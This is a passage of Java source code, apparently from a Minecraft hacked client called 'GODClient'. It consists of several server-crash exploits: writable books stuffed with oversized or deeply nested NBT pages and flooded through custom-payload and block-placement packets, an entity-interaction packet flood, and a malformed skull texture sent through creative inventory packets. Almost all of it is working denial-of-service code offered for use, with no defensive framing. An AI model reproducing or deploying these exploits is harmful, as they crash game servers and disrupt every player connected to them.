],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}";
        list.appendTag((NBTBase) new NBTTagString(row));
        comp.setString("author", randomNumber(50));
        comp.setString("title", "Crashed by GODClient");
        comp.setByte("resolved", (byte) 1);
        comp.setTag("pages", (NBTBase) list);
        ItemStack stack = new ItemStack(Items.writable_book);
        stack.setTagCompound(comp);
        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        buffer.writeItemStackToBuffer(stack);
        Packet<?> pack = null;
        for (int i = 0; i < 50; i++) {
            C17PacketCustomPayload cPacketCustomPayload;
            ((Minecraft.getMinecraft()).thePlayer.sendQueue.getNetworkManager()).channel.writeAndFlush(cPacketCustomPayload = new C17PacketCustomPayload("MC|BEdit", buffer));
        }
        toggle();
    }

    public static String randomNumber(int length) {
        return random(length, "123456789");
    }

    public static String random(int length, String chars) {
        return random(length, chars.toCharArray());
    }

    public static String random(int length, char[] chars) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++)
            stringBuilder.append(chars[(new Random()).nextInt(chars.length)]);
        return stringBuilder.toString();
    }


    public void Exploitfix() {
        ItemStack book = null;

        book = new ItemStack(Items.writable_book);

        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = mc.getSession().getUsername();
        final String title = "Meta.exe";
        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        for (int i = 0; i < 50; ++i) {
            final NBTTagString tString = new NBTTagString(size);
            list.appendTag((NBTBase) tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", (NBTBase) list);
        book.setTagInfo("pages", (NBTBase) list);
        book.setTagCompound(tag);
        try {
            for (int j = 0; j < 4; ++j) {
                mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(
                        new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
            }
        } catch (Exception ex) {
        }
        toggle();
    }


    public void Netty() {
        for (int i2 = 0; i2 < 50; ++i2) {
            ItemStack book = new ItemStack(Items.writable_book);
            String author = "Netty" + new Random().nextInt(50);
            String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
            NBTTagCompound tag = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            for (int i3 = 0; i3 < 340; ++i3) {
                String siteContent = size;
                NBTTagString tString = new NBTTagString(siteContent);
                list.appendTag(tString);
            }
            tag.setString("author", author);
            tag.setString("title", "");
            tag.setTag("pages", list);
            if (book.hasTagCompound()) {
                NBTTagCompound tagb = book.getTagCompound();
                tagb.setTag("pages", list);
            } else {
                book.setTagInfo("pages", list);
            }
            mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
        }
        toggle();
    }


    public void Entity() {
        try {


            if (Minecraft.getMinecraft().objectMouseOver.entityHit == null) {
                PlayerUtils.sendMessage("kuke Bitte auf ein Entity");
            }
            if (TimeHelper.hasReached(1000)) {
                if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
                    for (int i = 0; i < 600; i++) {
                        (Minecraft.getMinecraft().getNetHandler().getNetworkManager()).channel.writeAndFlush(new C02PacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit, C02PacketUseEntity.Action.INTERACT));
                    }
                    TimeHelper.reset();
                }

            }


        } catch (Throwable throwable) {
            return;
        }
    }

    public void head() {
        String crashValue = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIifX19=";

        String bypassCrashValue = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIgLm1vamFuZy5jb20ifX19=";

        String signature = "TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=";


        ItemStack item = new ItemStack(Items.skull, 1, 3);
        final NBTTagCompound base = new NBTTagCompound();
        base.setString("SkullOwner", "Aethereum404");
        final NBTTagCompound skullOwner = new NBTTagCompound();
        skullOwner.setString("Id", "6c3a735f433c4c5caae23211d7e7acdc");
        skullOwner.setString("Name", "Aethereum404");
        final NBTTagCompound display = new NBTTagCompound();
        display.setString("Name", "�4\"Gew\u00f6hnlicher\" �4Kopf");
        final NBTTagCompound properties = new NBTTagCompound();
        final NBTTagList textures = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Signature", "TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=");
        tag.setString("Value", "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIgLm1vamFuZy5jb20ifX19=");
        item.setTagCompound(base);
        textures.appendTag(tag);
        properties.setTag("textures", textures);
        skullOwner.setTag("Properties", properties);
        base.setTag("SkullOwner", skullOwner);
        base.setTag("display", display);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((Packet) new C10PacketCreativeInventoryAction(5, item));

        toggle();
    }

    public void Place() {
        ItemStack book = null;

        book = new ItemStack(Items.writable_book);

        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = mc.getSession().getUsername();
        final String title = "Meta.exe";
        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        for (int i = 0; i < 50; ++i) {
            final NBTTagString tString = new NBTTagString(size);
            list.appendTag((NBTBase) tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", (NBTBase) list);
        book.setTagInfo("pages", (NBTBase) list);
        book.setTagCompound(tag);
        try {
            for (int j = 0; j < 45; ++j) {
                mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
            }
        } catch (Exception ex) {
        }
    }


    public void MinePlex() {
        for (int c = 0; c < 30; ++c) {
            NBTTagCompound comp = new NBTTagCompound();
            NBTTagList list = new NBTTagList();

            for (int i = 0; i < 2; ++i) {
                list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}]